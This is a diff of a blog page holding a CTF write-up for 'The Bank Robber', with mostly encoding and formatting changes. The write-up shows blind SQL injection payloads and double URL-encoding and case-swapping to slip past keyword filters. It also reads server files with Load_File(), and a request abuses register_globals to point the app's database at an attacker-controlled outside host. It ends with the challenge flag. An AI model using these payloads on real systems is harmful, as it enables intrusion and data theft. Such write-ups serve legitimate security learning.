@@ -74,7 +74,7 @@
   </header>
 
 
-<div class="entry-content"><h2>The Bank Robber</h2>
+<div class="entry-content"><h2 id="the-bank-robber">The Bank Robber</h2>
 
 <p>This is an excelent challenge. Thanks for the awesome CTF.</p>
 
@@ -98,21 +98,21 @@
 
 <p><code>GET ./M.list.idx&amp;lt;30--.1</code> returns 29 results.</p>
 
-<p>At first, we use %23(&#8216;#&#8217;) to comment out the rest part of the query. But it seems useless. (We are not familiar with mod_rewrite&#8230;) Later, we found &#8216;&#8211;&#8217; took effect because &#8216;&ndash;&#8217; won&#8217;t be escaped.</p>
+<p>At first, we use %23(‘#’) to comment out the rest part of the query. But it seems useless. (We are not familiar with mod_rewrite…) Later, we found ‘–’ took effect because ‘-’ won’t be escaped.</p>
 
-<p><code>GET ./M.list.idx&amp;lt;=(select ascii(substring(user(),1,1)))-80--.1</code> </br></p>
+<p><code>GET ./M.list.idx&amp;lt;=(select ascii(substring(user(),1,1)))-80--.1</code> &lt;/br&gt;</p>
 
-<p>We use blind injection to get some useless information such as user(), database(), version()&#8230;</p>
+<p>We use blind injection to get some useless information such as user(), database(), version()…</p>
 
-<p>But we don&#8217;t know how to query the information_schema database to get more information about the database structure, because the <code>'.'</code> is used as the split point in the URL.</p>
+<p>But we don’t know how to query the information_schema database to get more information about the database structure, because the <code>'.'</code> is used as the split point in the URL.</p>
 
-<p>Moreover, We don&#8217;t know how to use <code>order by 1</code> or <code>and 1=1</code> to gain deeper information about this injection. We thought the $column is strictly filtered.. We were confused then.</p>
+<p>Moreover, We don’t know how to use <code>order by 1</code> or <code>and 1=1</code> to gain deeper information about this injection. We thought the $column is strictly filtered.. We were confused then.</p>
 
 <p>Flanker accidently found that <code>./M.list.id%2bx.1</code> returns normal page. I fell deep in thought.</p>
 
 <p>I realized that the URL was unescaped twice (it is evident if I were familiar with mod_rewrite) and filtered space(<code>' '</code>). The transformation is <code>'%2b' =&amp;gt; '+' =&amp;gt; ' ' =&amp;gt; ''</code></p>
 
-<p>Then I knew how to use <code>'.'</code> in the query and what&#8217;s wrong with the <code>order by</code> and other clauses.</p>
+<p>Then I knew how to use <code>'.'</code> in the query and what’s wrong with the <code>order by</code> and other clauses.</p>
 
 <p>I use <code>'%252e'</code> to represent <code>'.'</code> and <code>'%252f%252a%252a%252f'('/**/')</code> to represent <code>'&lt;br /&gt;&lt;br /&gt;
 '</code>. (In fact, <code>'/**/'</code> is also effective)</p>
@@ -121,7 +121,7 @@
 
 <p>I found <code>order/**/by/**/1</code> returns normal page, but <code>order/**/by/**/2</code> returns empty page, so there was only one column in the SQL query.</p>
 
-<p>But it went wrong when I constructed a &#8216;union select&#8217; query. Then I found &#8216;union&#8217;, &#8216;select&#8217; and &#8216;from&#8217; was filtered.</p>
+<p>But it went wrong when I constructed a ‘union select’ query. Then I found ‘union’, ‘select’ and ‘from’ was filtered.</p>
 
 <p>GET <code>'./M.idx=1-select-.1'</code> Normal</p>
 
@@ -139,13 +139,29 @@
 
 <p>so the filter function might be</p>
 
-<blockquote><blockquote><p>replace &#8216;select&#8217; to &#8221; in $column</p>
+<blockquote>
+  <blockquote>
+    <p>replace ‘select’ to ” in $column</p>
+  </blockquote>
+</blockquote>
 
-<p>replace &#8216;union&#8217; to &#8221; in $column</p>
+<blockquote>
+  <blockquote>
+    <p>replace ‘union’ to ” in $column</p>
+  </blockquote>
+</blockquote>
 
-<p>replace &#8216;from&#8217; to &#8221; in $column</p>
+<blockquote>
+  <blockquote>
+    <p>replace ‘from’ to ” in $column</p>
+  </blockquote>
+</blockquote>
 
-<p>replace &#8216; &#8216; to &#8221; in $column</p></blockquote></blockquote>
+<blockquote>
+  <blockquote>
+    <p>replace ‘ ‘ to ” in $column</p>
+  </blockquote>
+</blockquote>
 
 <p>It was easy to find that <code>'Select', 'Union', 'From'</code> were not filtered.</p>
 
@@ -158,7 +174,7 @@
 
 <p>We were stucked soon. Because there was nothing special in the database.</p>
 
-<p>But we found we could load files from the server. The only way to go on was to use load&#95;file() to read files from server. (load&#95;file() is also filtered so we use Load_File())</p>
+<p>But we found we could load files from the server. The only way to go on was to use load_file() to read files from server. (load_file() is also filtered so we use Load_File())</p>
 
 <p>Having tried many filenames, Flanker (again~) found the the <code>'/site/.htaccess'</code> is readable. So we could get some special information in source code.</p>
 
@@ -199,7 +215,7 @@
 
 <p>Since we could register globals, we could modify some variable such as <code>$_BHVAR</code>.</p>
 
-<p>The database connection settings were stored in <code>./lib/database.php</code>. If we change the $&#95;BHVAR[&lsquo;path&#95;lib&rsquo;], the <code>./lib/database.php</code> could not be included correctly, we could use our own mysql server to answer the query.</p>
+<p>The database connection settings were stored in <code>./lib/database.php</code>. If we change the $_BHVAR[‘path_lib’], the <code>./lib/database.php</code> could not be included correctly, we could use our own mysql server to answer the query.</p>
 
 <p>Then we create a table for this challenge. Thanks aay for offerring vps.</p>
 
@@ -209,7 +225,7 @@
 http://1.234.27.139:61080/Main_Site/TBR.php?_type=P&amp;_skin=1&amp;_BHVAR[path_module]=./modules/&amp;_BHVAR[db][host]=50.115.47.187&amp;_BHVAR[db][user]=BH&amp;_BHVAR[db][pass]=BHBH&amp;_BHVAR[db][name]=BH
 </code></pre>
 
-<p>key is&#8230; @<em>Y0UR&#95;EY3&#95;LEE_SIN</em>@</p>
+<p>key is… @<em>Y0UR_EY3_LEE_SIN</em>@</p>
 </div>
 
 
@@ -271,6 +287,10 @@ http://1.234.27.139:61080/Main_Site/TBR.php?_type=P&amp;_skin=1&amp;_BHVAR[path_
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/csaw-ctf-2013-crypto500-writeup/">CSAW CTF 2013 Crypto500 Writeup</a>
+      </li>
+    
+      <li class="post">
         <a href="/asis-ctf-finals-2013-login/">ASIS CTF Finals 2013 Login</a>
       </li>
     
@@ -284,10 +304,6 @@ http://1.234.27.139:61080/Main_Site/TBR.php?_type=P&amp;_skin=1&amp;_BHVAR[path_
     
       <li class="post">
         <a href="/ufoctf2013-web100-flagstore/">UFOCTF2013 Web100 FlagStore</a>
-      </li>
-    
-      <li class="post">
-        <a href="/sigint-2013-crypto300-satisfaction/">SIGINT 2013 Crypto300 Satisfaction</a>
       </li>
     
   </ul>
